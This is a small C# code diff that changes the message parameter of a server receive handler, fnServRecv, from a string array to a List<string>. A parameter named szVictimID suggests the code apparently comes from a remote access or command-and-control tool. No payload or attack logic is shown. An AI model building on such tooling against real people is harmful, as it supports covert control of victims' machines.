@@ -23,7 +23,7 @@ namespace Eden
             m_entry = entry;
         }
 
-        private void fnServRecv(clsClient clnt, string szVictimID, string[] asMsg)
+        private void fnServRecv(clsClient clnt, string szVictimID, List<string> asMsg)
         {
             try
             {
